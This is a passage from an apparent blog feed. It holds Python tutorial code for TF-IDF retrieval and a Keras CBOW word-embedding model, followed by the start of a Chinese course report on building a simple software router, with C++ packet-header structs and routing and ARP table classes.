class="line">        <span class="string">"prob"</span>: <span class="keyword">lambda</span> x: np.maximum(<span class="number">0</span>, np.log((len(docs) - x) / (x+<span class="number">1</span>))),</span><br><span class="line">        <span class="string">"len_norm"</span>: <span class="keyword">lambda</span> x: x / (np.sum(np.square(x))+<span class="number">1</span>),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tf</span><span class="params">(method=<span class="string">"log"</span>)</span>:</span></span><br><span class="line">    <span class="comment"># term frequency: how frequent a word appears in a doc</span></span><br><span class="line">    _tf = np.zeros((len(vocab), len(docs)), dtype=np.float64)    <span class="comment"># [n_vocab, n_doc]</span></span><br><span class="line">    <span class="keyword">for</span> i, d <span class="keyword">in</span> enumerate(docs_words):</span><br><span class="line">        counter = Counter(d)</span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> counter.keys():</span><br><span class="line">            _tf[v2i[v], i] = counter[v] / counter.most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    weighted_tf = tf_methods.get(method, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> weighted_tf <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError</span><br><span class="line">    <span class="keyword">return</span> weighted_tf(_tf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_idf</span><span class="params">(method=<span class="string">"log"</span>)</span>:</span></span><br><span class="line">    <span class="comment"># inverse document frequency: low idf for a word appears in more docs, mean less important</span></span><br><span class="line">    df = np.zeros((len(i2v), <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(i2v)):</span><br><span class="line">        d_count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> docs_words:</span><br><span class="line">            d_count += <span class="number">1</span> <span class="keyword">if</span> i2v[i] <span class="keyword">in</span> d <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        df[i, <span class="number">0</span>] = d_count</span><br><span class="line"></span><br><span class="line">    idf_fn = idf_methods.get(method, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> idf_fn <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError</span><br><span class="line">    <span class="keyword">return</span> idf_fn(df)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cosine_similarity</span><span class="params">(q, _tf_idf)</span>:</span></span><br><span class="line">    unit_q = q / np.sqrt(np.sum(np.square(q), axis=<span class="number">0</span>, keepdims=<span class="literal">True</span>))</span><br><span class="line">    unit_ds = _tf_idf / np.sqrt(np.sum(np.square(_tf_idf), axis=<span class="number">0</span>, keepdims=<span class="literal">True</span>))</span><br><span class="line">    similarity = unit_ds.T.dot(unit_q).ravel()</span><br><span class="line">    <span class="keyword">return</span> similarity</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">docs_score</span><span class="params">(q, len_norm=False)</span>:</span></span><br><span class="line">    q_words = q.replace(<span class="string">","</span>, <span class="string">""</span>).split(<span class="string">" "</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add unknown words</span></span><br><span class="line">    unknown_v = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> set(q_words):</span><br><span class="line">        <span class="keyword">if</span> v <span class="keyword">not</span> <span class="keyword">in</span> v2i:</span><br><span class="line">            v2i[v] = len(v2i)</span><br><span class="line">            i2v[len(v2i)<span class="number">-1</span>] = v</span><br><span class="line">            unknown_v += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> unknown_v &gt; <span class="number">0</span>:</span><br><span class="line">        _idf = np.concatenate((idf, np.zeros((unknown_v, <span class="number">1</span>), dtype=np.float)), axis=<span class="number">0</span>)</span><br><span class="line">        _tf_idf = np.concatenate((tf_idf, np.zeros((unknown_v, tf_idf.shape[<span class="number">1</span>]), dtype=np.float)), axis=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        _idf, _tf_idf = idf, tf_idf</span><br><span class="line">    counter = Counter(q_words)</span><br><span class="line">    q_tf = np.zeros((len(_idf), <span class="number">1</span>), dtype=np.float)     <span class="comment"># [n_vocab, 1]</span></span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> counter.keys():</span><br><span class="line">        q_tf[v2i[v], <span class="number">0</span>] = counter[v]</span><br><span class="line"></span><br><span class="line">    q_vec = q_tf * _idf            <span class="comment"># [n_vocab, 1]</span></span><br><span class="line"></span><br><span class="line">    q_scores = cosine_similarity(q_vec, _tf_idf)</span><br><span class="line">    <span class="keyword">if</span> len_norm:</span><br><span class="line">        len_docs = [len(d) <span class="keyword">for</span> d <span class="keyword">in</span> docs_words]</span><br><span class="line">        q_scores = q_scores / np.array(len_docs)</span><br><span class="line">    <span class="keyword">return</span> q_scores</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_keywords</span><span class="params">(n=<span class="number">2</span>)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        col = tf_idf[:, c]</span><br><span class="line">        idx = np.argsort(col)[-n:]<span class="comment"># 将矩阵col按照axis（默认-1）进行排序，返回排序后的下标</span></span><br><span class="line">        print(<span class="string">"doc&#123;&#125;, top&#123;&#125; keywords &#123;&#125;"</span>.format(c, n, [i2v[i] <span class="keyword">for</span> i <span class="keyword">in</span> idx]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tf = get_tf()           <span class="comment"># [n_vocab, n_doc]</span></span><br><span class="line">idf = get_idf()         <span class="comment"># [n_vocab, 1]</span></span><br><span class="line">tf_idf = tf * idf       <span class="comment"># [n_vocab, n_doc]</span></span><br><span class="line">print(<span class="string">"tf shape(vecb in each docs): "</span>, tf.shape)</span><br><span class="line">print(<span class="string">"\ntf samples:\n"</span>, tf[:<span class="number">2</span>])</span><br><span class="line">print(<span class="string">"\nidf shape(vecb in all docs): "</span>, idf.shape)</span><br><span class="line">print(<span class="string">"\nidf samples:\n"</span>, idf[:<span class="number">2</span>])</span><br><span class="line">print(<span class="string">"\ntf_idf shape: "</span>, tf_idf.shape)</span><br><span class="line">print(<span class="string">"\ntf_idf sample:\n"</span>, tf_idf[:<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># test</span></span><br><span class="line">get_keywords()</span><br><span class="line">q = <span class="string">"I get a coffee cup"</span></span><br><span class="line">scores = docs_score(q)</span><br><span class="line">d_ids = scores.argsort()[<span class="number">-3</span>:][::<span class="number">-1</span>]</span><br><span class="line">print(<span class="string">"\ntop 3 docs for '&#123;&#125;':\n&#123;&#125;"</span>.format(q, [docs[i] <span class="keyword">for</span> i <span class="keyword">in</span> d_ids]))</span><br><span class="line"></span><br><span class="line">show_tfidf(tf_idf.T, [i2v[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(tf_idf.shape[<span class="number">0</span>])], <span class="string">"tfidf_matrix"</span>)</span><br></pre></td></tr></table></figure>



<h1 id="Sklearn"><a href="#Sklearn" class="headerlink" title="Sklearn"></a>Sklearn</h1><p>稀疏向量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.feature_extraction.text <span class="keyword">import</span> TfidfVectorizer</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics.pairwise <span class="keyword">import</span> cosine_similarity</span><br><span class="line"><span class="keyword">from</span> visual <span class="keyword">import</span> show_tfidf   <span class="comment"># this refers to visual.py in my [repo](https://github.com/MorvanZhou/NLP-Tutorials/)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docs = [</span><br><span class="line">    <span class="string">"it is a good day, I like to stay here"</span>,</span><br><span class="line">    <span class="string">"I am happy to be here"</span>,</span><br><span class="line">    <span class="string">"I am bob"</span>,</span><br><span class="line">    <span class="string">"it is sunny today"</span>,</span><br><span class="line">    <span class="string">"I have a party today"</span>,</span><br><span class="line">    <span class="string">"it is a dog and that is a cat"</span>,</span><br><span class="line">    <span class="string">"there are dog and cat on the tree"</span>,</span><br><span class="line">    <span class="string">"I study hard this morning"</span>,</span><br><span class="line">    <span class="string">"today is a good day"</span>,</span><br><span class="line">    <span class="string">"tomorrow will be a good day"</span>,</span><br><span class="line">    <span class="string">"I like coffee, I like book and I like apple"</span>,</span><br><span class="line">    <span class="string">"I do not like it"</span>,</span><br><span class="line">    <span class="string">"I am kitty, I like bob"</span>,</span><br><span class="line">    <span class="string">"I do not care who like bob, but I like kitty"</span>,</span><br><span class="line">    <span class="string">"It is coffee time, bring your cup"</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vectorizer = TfidfVectorizer()</span><br><span class="line">tf_idf = vectorizer.fit_transform(docs)</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印idf值</span></span><br><span class="line">print(<span class="string">"idf: "</span>, [(n, idf) <span class="keyword">for</span> idf, n <span class="keyword">in</span> zip(vectorizer.idf_, vectorizer.get_feature_names())])</span><br><span class="line"><span class="comment">#打印词语和idf的对应</span></span><br><span class="line">print(<span class="string">"v2i: "</span>, vectorizer.vocabulary_)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q = <span class="string">"I get a coffee cup"</span></span><br><span class="line">qtf_idf = vectorizer.transform([q])<span class="comment">#计算q的idf</span></span><br><span class="line">res = cosine_similarity(tf_idf, qtf_idf) <span class="comment">#比对</span></span><br><span class="line">res = res.ravel().argsort()[<span class="number">-3</span>:]</span><br><span class="line">print(<span class="string">"\ntop 3 docs for '&#123;&#125;':\n&#123;&#125;"</span>.format(q, [docs[i] <span class="keyword">for</span> i <span class="keyword">in</span> res[::<span class="number">-1</span>]]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i2v = &#123;i: v <span class="keyword">for</span> v, i <span class="keyword">in</span> vectorizer.vocabulary_.items()&#125;</span><br><span class="line">dense_tfidf = tf_idf.todense()</span><br><span class="line">show_tfidf(dense_tfidf, [i2v[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(dense_tfidf.shape[<span class="number">1</span>])], <span class="string">"tfidf_sklearn_matrix"</span>)</span><br></pre></td></tr></table></figure>





<h1 id="CBOW"><a href="#CBOW" class="headerlink" title="CBOW"></a>CBOW</h1><p>预测词和前后文之间的关系</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># [Efficient Estimation of Word Representations in Vector Space](https://arxiv.org/pdf/1301.3781.pdf)</span></span><br><span class="line"><span class="keyword">from</span> tensorflow <span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> process_w2v_data  <span class="comment"># this refers to utils.py in my [repo](https://github.com/MorvanZhou/NLP-Tutorials/)</span></span><br><span class="line"><span class="keyword">from</span> visual <span class="keyword">import</span> show_w2v_word_embedding  <span class="comment"># this refers to visual.py in my [repo](https://github.com/MorvanZhou/NLP-Tutorials/)</span></span><br><span class="line"></span><br><span class="line">corpus = [</span><br><span class="line">    <span class="comment"># numbers</span></span><br><span class="line">    <span class="string">"5 2 4 8 6 2 3 6 4"</span>,</span><br><span class="line">    <span class="string">"4 8 5 6 9 5 5 6"</span>,</span><br><span class="line">    <span class="string">"1 1 5 2 3 3 8"</span>,</span><br><span class="line">    <span class="string">"3 6 9 6 8 7 4 6 3"</span>,</span><br><span class="line">    <span class="string">"8 9 9 6 1 4 3 4"</span>,</span><br><span class="line">    <span class="string">"1 0 2 0 2 1 3 3 3 3 3"</span>,</span><br><span class="line">    <span class="string">"9 3 3 0 1 4 7 8"</span>,</span><br><span class="line">    <span class="string">"9 9 8 5 6 7 1 2 3 0 1 0"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment"># alphabets, expecting that 9 is close to letters</span></span><br><span class="line">    <span class="string">"a t g q e h 9 u f"</span>,</span><br><span class="line">    <span class="string">"e q y u o i p s"</span>,</span><br><span class="line">    <span class="string">"q o 9 p l k j o k k o p"</span>,</span><br><span class="line">    <span class="string">"h g y i u t t a e q"</span>,</span><br><span class="line">    <span class="string">"i k d q r e 9 e a d"</span>,</span><br><span class="line">    <span class="string">"o p d g 9 s a f g a"</span>,</span><br><span class="line">    <span class="string">"i u y g h k l a s w"</span>,</span><br><span class="line">    <span class="string">"o l u y a o g f s"</span>,</span><br><span class="line">    <span class="string">"o p i u y g d a s j d l"</span>,</span><br><span class="line">    <span class="string">"u k i l o 9 l j s"</span>,</span><br><span class="line">    <span class="string">"y g i s h k j l f r f"</span>,</span><br><span class="line">    <span class="string">"i o h n 9 9 d 9 f a 9"</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CBOW</span><span class="params">(keras.Model)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, v_dim, emb_dim)</span>:</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.v_dim = v_dim</span><br><span class="line">        self.embeddings = keras.layers.Embedding(</span><br><span class="line">            input_dim=v_dim, output_dim=emb_dim,  <span class="comment"># [n_vocab, emb_dim]</span></span><br><span class="line">            embeddings_initializer=keras.initializers.RandomNormal(<span class="number">0.</span>, <span class="number">0.1</span>),</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># noise-contrastive estimation</span></span><br><span class="line">        self.nce_w = self.add_weight(</span><br><span class="line">            name=<span class="string">"nce_w"</span>, shape=[v_dim, emb_dim],</span><br><span class="line">            initializer=keras.initializers.TruncatedNormal(<span class="number">0.</span>, <span class="number">0.1</span>))  <span class="comment"># [n_vocab, emb_dim]</span></span><br><span class="line">        self.nce_b = self.add_weight(</span><br><span class="line">            name=<span class="string">"nce_b"</span>, shape=(v_dim,),</span><br><span class="line">            initializer=keras.initializers.Constant(<span class="number">0.1</span>))  <span class="comment"># [n_vocab, ]</span></span><br><span class="line"></span><br><span class="line">        self.opt = keras.optimizers.Adam(<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">call</span><span class="params">(self, x, training=None, mask=None)</span>:</span></span><br><span class="line">        <span class="comment"># x.shape = [n, skip_window*2]</span></span><br><span class="line">        o = self.embeddings(x)          <span class="comment"># [n, skip_window*2, emb_dim]</span></span><br><span class="line">        o = tf.reduce_mean(o, axis=<span class="number">1</span>)   <span class="comment"># [n, emb_dim]</span></span><br><span class="line">        <span class="keyword">return</span> o</span><br><span class="line"></span><br><span class="line">    <span class="comment"># negative sampling: take one positive label and num_sampled negative labels to compute the loss</span></span><br><span class="line">    <span class="comment"># in order to reduce the computation of full softmax</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loss</span><span class="params">(self, x, y, training=None)</span>:</span></span><br><span class="line">        embedded = self.call(x, training)</span><br><span class="line">        <span class="keyword">return</span> tf.reduce_mean(</span><br><span class="line">            tf.nn.nce_loss(</span><br><span class="line">                weights=self.nce_w, biases=self.nce_b, labels=tf.expand_dims(y, axis=<span class="number">1</span>),</span><br><span class="line">                inputs=embedded, num_sampled=<span class="number">5</span>, num_classes=self.v_dim))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">step</span><span class="params">(self, x, y)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:</span><br><span class="line">            loss = self.loss(x, y, <span class="literal">True</span>)</span><br><span class="line">            grads = tape.gradient(loss, self.trainable_variables)</span><br><span class="line">        self.opt.apply_gradients(zip(grads, self.trainable_variables))</span><br><span class="line">        <span class="keyword">return</span> loss.numpy()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">(model, data)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">2500</span>):</span><br><span class="line">        bx, by = data.sample(<span class="number">8</span>)</span><br><span class="line">        loss = model.step(bx, by)</span><br><span class="line">        <span class="keyword">if</span> t % <span class="number">200</span> == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">"step: &#123;&#125; | loss: &#123;&#125;"</span>.format(t, loss))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#skip_window 取词区间，2-5</span></span><br><span class="line">    d = process_w2v_data(corpus, skip_window=<span class="number">2</span>, method=<span class="string">"cbow"</span>)</span><br><span class="line">    m = CBOW(d.num_word, <span class="number">2</span>)</span><br><span class="line">    train(m, d)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># plotting</span></span><br><span class="line">    show_w2v_word_embedding(m, d, <span class="string">"./visual/results/cbow.png"</span>)</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>网络技术与应用大作业 简单路由器程序的设计</title>
    <url>/2021/01/30/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E7%BD%91%E6%8A%80%E5%A4%A7%E4%BD%9C%E4%B8%9A%E8%B7%AF%E7%94%B1%E5%99%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="设计性大作业（1）-简单路由器程序的设计"><a href="#设计性大作业（1）-简单路由器程序的设计" class="headerlink" title="设计性大作业（1） 简单路由器程序的设计"></a>设计性大作业（1） 简单路由器程序的设计</h1><h2 id="内容说明"><a href="#内容说明" class="headerlink" title="内容说明"></a>内容说明</h2><p>简单路由器程序设计实验的具体要求为：</p>
<p>（1）设计和实现一个路由器程序，要求完成的路由器程序能和现有的路由器产品（如思科路由器、华为路由器、微软的路由器等）进行协同工作。</p>
<p>（2）程序可以仅实现IP数据报的获取、选路、投递等路由器要求的基本功能。可以忽略分片处理、选项处理、动态路由表生成等功能。</p>
<p>（3）需要给出路由表的手工插入、删除方法。</p>
<p>（4）需要给出路由器的工作日志，显示数据报获取和转发过程。</p>
<p>（5）完成的程序须通过现场测试，并在班（或小组）中展示和报告自己的设计思路、开发和实现过程、测试方法和过程。</p>
<h2 id="第1节-实验步骤"><a href="#第1节-实验步骤" class="headerlink" title="第1节 实验步骤"></a><strong>第1节</strong> 实验步骤</h2><h3 id="实验设计思路"><a href="#实验设计思路" class="headerlink" title="实验设计思路"></a>实验设计思路</h3><h4 id="路由器工作流程"><a href="#路由器工作流程" class="headerlink" title="路由器工作流程"></a>路由器工作流程</h4><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%BD%91%E6%8A%80%E5%A4%A7%E4%BD%9C%E4%B8%9A%E8%B7%AF%E7%94%B1%E5%99%A8/image-20201225151249943.png"  alt="image-20201225151249943"></p>
<p>具体工作流程详见下一部分的代码解析</p>
<h3 id="关键代码分析"><a href="#关键代码分析" class="headerlink" title="关键代码分析"></a>关键代码分析</h3><h4 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(1)<span class="comment">//以1byte方式对齐</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()<span class="comment">//恢复4bytes对齐</span></span></span><br></pre></td></tr></table></figure>

<p><strong>报文首部</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">FrameHeader_t</span> &#123;</span><span class="comment">//帧首部</span></span><br><span class="line">	BYTE DesMAC[<span class="number">6</span>];<span class="comment">//目的地址</span></span><br><span class="line">	BYTE SrcMAC[<span class="number">6</span>];<span class="comment">//源地址</span></span><br><span class="line">	WORD FrameType;<span class="comment">//帧类型</span></span><br><span class="line">&#125;FrameHeader_t;</span><br></pre></td></tr></table></figure>

<p><strong>ARP报文格式</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ARPFrame_t</span> &#123;</span></span><br><span class="line">	FrameHeader_t FrameHeader;<span class="comment">//帧首部</span></span><br><span class="line">	WORD HardwareType;<span class="comment">//硬件类型</span></span><br><span class="line">	WORD ProtocolType;<span class="comment">//协议类型</span></span><br><span class="line">	BYTE HLen;<span class="comment">//硬件地址长度</span></span><br><span class="line">	BYTE PLen;<span class="comment">//协议地址</span></span><br><span class="line">	WORD Operation;<span class="comment">//操作</span></span><br><span class="line">	BYTE SendHa[<span class="number">6</span>];<span class="comment">//发送方MAC</span></span><br><span class="line">	DWORD SendIP;<span class="comment">//发送方IP</span></span><br><span class="line">	BYTE RecvHa[<span class="number">6</span>];<span class="comment">//接收方MAC</span></span><br><span class="line">	DWORD RecvIP;<span class="comment">//接收方IP</span></span><br><span class="line">&#125;ARPFrame_t;</span><br></pre></td></tr></table></figure>

<p><strong>IP报文首部</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">IPHeader_t</span> &#123;</span><span class="comment">//IP首部</span></span><br><span class="line">	BYTE Ver_HLen;</span><br><span class="line">	BYTE TOS;</span><br><span class="line">	WORD TotalLen;</span><br><span class="line">	WORD ID;</span><br><span class="line">	WORD Flag_Segment;</span><br><span class="line">	BYTE TTL;<span class="comment">//生命周期</span></span><br><span class="line">	BYTE Protocol;</span><br><span class="line">	WORD Checksum;<span class="comment">//校验和</span></span><br><span class="line">	ULONG SrcIP;<span class="comment">//源IP</span></span><br><span class="line">	ULONG DstIP;<span class="comment">//目的IP</span></span><br><span class="line">&#125;IPHeader_t;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Data_t</span> &#123;</span><span class="comment">//包含帧首部和IP首部的数据包</span></span><br><span class="line">	FrameHeader_t FrameHeader;<span class="comment">//帧首部</span></span><br><span class="line">	IPHeader_t IPHeader;<span class="comment">//IP首部</span></span><br><span class="line">&#125;Data_t;</span><br></pre></td></tr></table></figure>

<p><strong>ICMP报文格式</strong></p>
<p>由于本次实验只对ICMP数据报进行简单解析，不需要复杂操作，所以只用char*表示即可</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ICMP</span> &#123;</span><span class="comment">//包含帧首部和IP首部的数据包</span></span><br><span class="line">	FrameHeader_t FrameHeader;</span><br><span class="line">	IPHeader_t IPHeader;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">0x80</span>];</span><br><span class="line">&#125;ICMP_t;</span><br></pre></td></tr></table></figure>

<h4 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h4><p><strong>路由表表项</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">routeitem</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	DWORD mask;<span class="comment">//掩码</span></span><br><span class="line">	DWORD net;<span class="comment">//目的网络</span></span><br><span class="line">	DWORD nextip;<span class="comment">//下一跳</span></span><br><span class="line">	<span class="keyword">int</span> index;<span class="comment">//第几条</span></span><br><span class="line">	<span class="keyword">int</span> type;<span class="comment">//0为直接连接，1为用户添加，1不可删除</span></span><br><span class="line">	routeitem* nextitem;<span class="comment">//采用链表形式存储</span></span><br><span class="line">	routeitem()</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">memset</span>(<span class="keyword">this</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(*<span class="keyword">this</span>));<span class="comment">//初始化为全0</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">printitem</span><span class="params">()</span></span>;<span class="comment">//打印表项内容，打印出掩码、目的网络和下一跳IP、类型（是否是直接投递）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>路由表</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">routetable</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	routeitem* head, * tail;<span class="comment">//支持最多添加50转发表</span></span><br><span class="line">	<span class="keyword">int</span> num;<span class="comment">//条数</span></span><br><span class="line">	routetable();<span class="comment">//初始化，添加直接连接的网络</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//路由表的添加，直接投递在最前，前缀长的在前面</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(routeitem* a)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//删除，type=0不能删除</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span></span>;</span><br><span class="line">	<span class="comment">//路由表的打印 mask net next type</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="comment">//查找，最长前缀,返回下一跳的ip</span></span><br><span class="line">	<span class="function">DWORD <span class="title">lookup</span><span class="params">(DWORD ip)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">routetable::routetable()<span class="comment">//初始化，添加直接连接的网络</span></span><br><span class="line">&#123;</span><br><span class="line">	head = <span class="keyword">new</span> routeitem;</span><br><span class="line">	tail = <span class="keyword">new</span> routeitem;</span><br><span class="line">	head-&gt;nextitem = tail;</span><br><span class="line">	num = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		routeitem* temp = <span class="keyword">new</span> routeitem;</span><br><span class="line">		temp-&gt;net = (inet_addr(ip[i])) &amp; (inet_addr(mask[i]));<span class="comment">//本机网卡的ip和掩码进行按位与即为所在网络</span></span><br><span class="line">		temp-&gt;mask = inet_addr(mask[i]);</span><br><span class="line">		temp-&gt;type = <span class="number">0</span>;<span class="comment">//0表示直接投递的网络，不可删除</span></span><br><span class="line">		<span class="keyword">this</span>-&gt;add(temp);<span class="comment">//添加表项</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ARP表</strong></p>
<p>为减少发送ARP请求的次数，将IP和MAC的对应关系存储在一张表里，在实际情况中需要设置表项的生命周期，防止一段时间后个别表项IP和MAC出现不对应的情况，本次实验较为简单，故没有设置</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">arptable</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	DWORD ip;<span class="comment">//IP</span></span><br><span class="line">	BYTE mac[<span class="number">6</span>];<span class="comment">//MAC</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">int</span> num;<span class="comment">//表项个数</span></span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(DWORD ip,BYTE mac[<span class="number">6</span>])</span></span>;<span class="comment">//插入</span></span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lookup</span><span class="params">(DWORD ip, BYTE mac[<span class="number">6</span>])</span></span>;<span class="comment">//查询</span></span><br><span class="line">&#125;atable[<span class="number">50</span>];</span><br></pre></td></tr></table></figure>

<p><strong>日志</strong></p>
<p>本次实验需要输出路由器的工作日志</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="keyword">int</span> index;<span class="comment">//索引</span></span><br><span class="line">	<span class="keyword">char</span> type[<span class="number">5</span>];<span class="comment">//arp和ip</span></span><br><span class="line">	<span class="comment">//具体内容</span></span><br><span class="line">	ipitem ip; arpitem arp;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">log</span>();<span class="comment">//打开文件进行写入</span></span><br><span class="line">	~<span class="built_in">log</span>();<span class="comment">//关闭文件</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">int</span> num;<span class="comment">//数量</span></span><br><span class="line">	<span class="keyword">static</span> <span class="built_in">log</span> diary[<span class="number">50</span>];<span class="comment">//日志</span></span><br><span class="line">	<span class="keyword">static</span> FILE* fp;</span><br><span class="line">	<span class="comment">//写入日志</span></span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">write2log_arp</span><span class="params">(ARPFrame_t*)</span></span>;<span class="comment">//arp类型</span></span><br><span 